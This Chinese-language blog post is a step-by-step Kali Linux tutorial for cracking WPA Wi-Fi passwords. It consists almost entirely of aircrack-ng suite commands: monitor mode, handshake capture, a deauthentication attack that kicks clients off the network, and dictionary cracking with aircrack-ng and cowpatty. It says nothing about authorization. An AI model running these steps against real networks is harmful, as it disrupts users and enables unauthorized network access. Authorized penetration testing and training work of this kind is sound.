---
layout: post
title: "Kali linux无线网络渗透测试"
subtitle: "Hello World, Hello Blog"
author: "Haike Nan"
tags: 
  - kali
  - linux
  - 无线
  - 渗透
---

所需工具：带监听模式的无线网卡、Kali linux虚拟机

**查看无线接口：**

```
iwconfig
```

**激活无线接口：**

```
ifconfig wlan0 up
```

**创建监听模式接口：**

```
airmon-ng start wlan0
```

如果提示先终止相关进程，则先运行：

```
airmon-ng check kill
```

再运行：

```
airmon-ng start wlan0
```

**扫描无线网络：**

```
airodump-ng wlan0mon
```

记下要渗透的AP的SSID、MAC和信道。

**抓取握手包：**

开启抓包，将包文件命名为test存入本地：

```
airodump-ng --bssid 00:00:00:00:00:D0 --channel 1 --write test wlan0mon
```

等待片刻，记下STATION栏下客户端的MAC。

在终端上新建标签，运行解除认证命令：

```
aireplay-ng -0 5 -a 00:00:00:00:00:D0 -c 00:00:00:00:00:D7 wlan0mon --ignore-negative-one
```

当先前标签右上角显示WPA handshake:时终止运行。

**破解密码：**

```
aircrack-ng -w zidian.lst test-01.cap
```

附：使用预先计算PSK来加快破解速度：

针对给定的字典名和SSID来预先计算PMK：

```
genpmk -f zidian.lst -d test2 -s "cisco"
```

生成名为test2的文件，其中包含了预先生成的PMK。

如果提示未找到命令 可先安装cowpatty：

```
apt-get install cowpatty
```

使用cowpatty破解密码：

```
cowpatty -d test2 -s "cisco" -r test-01.cap
```

